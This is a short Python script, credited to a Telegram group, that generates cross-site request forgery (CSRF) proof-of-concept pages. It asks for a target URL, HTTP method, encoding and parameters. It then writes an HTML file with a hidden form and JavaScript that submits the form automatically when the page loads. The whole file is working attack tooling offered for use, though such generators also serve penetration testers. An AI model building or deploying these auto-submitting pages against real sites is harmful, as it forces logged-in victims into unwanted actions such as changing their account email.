#!/usr/bin/python3
b ='''
       _/\/\/\_
       \______/
       | 0  0 |       Telegram: @BomaCode
     //   BM   \\\     Date: 2023/10/04
    //||------||\\\\    By: Jmeel Ahmad
   ///||      ||\\\\\\   Versions: 1.0
  /////\\\    //\\\\\\\\\  vulnerability: (CSRF)
 ///////\\\  //\\\\\\\\\\\\\ Group tel.: @BM_Code
         +  +         ------------------->
       ++++++++


#Description:
  [*]Creating a file in HTML and Javascript that exploits the "Cross Site Request Forgery (CSRF)" vulnerability.

#Reference
  Reference for identifying "Cross Site Request Forgery (CSRF)" vulnerability
    [OWASP] https://owasp.org/www-community/attacks/csrf
    [YOUTUBE] https://www.youtube.com/watch?v=ybkSlILo6QY

'''
print(b)

def csrf_poc():
     try:
        print("[*]Example: https://www.google.com/SET_email")
        url = input("[+]Enter Url Path~# ")

        print("\r\n[*]Example: GET,POST,HEAD")
        method = input("[+]Enter Method~# ")

        print("\r\n[*]Example:\r\n-> multipart/form-data\r\n-> application/x-www-form-urlencoded\r\n-> multipart/plain")
        encoding = input("[+]Enter Encoding~# ")

        print("\r\n[*]Example: email=testing@test.ts&id=32423")
        data = input("[+]Enter Data~# ")

        print("\r\n[Example: csrf_Poc.html")
        file_out = input("[+]Enter FileName OutPut~# ")


        csrf_html = f'<form id="submit" enctype="{encoding}" method="{method}" action="{url}">'

        for i in data.split("&"):
            name,value = i.split("=")
            csrf_html += f'<input type="hidden" value="{value}" name="{name}">'

        csrf_html += "</form>"
        csrf_html += '<script>document.getElementById("submit").submit()</script>'

        save_csrf_html = open(file_out,"w")
        save_csrf_html.write(csrf_html)
        save_csrf_html.close()

        print("\r\n[**]Done")
     except :
        print("[-]input error..!")

csrf_poc()
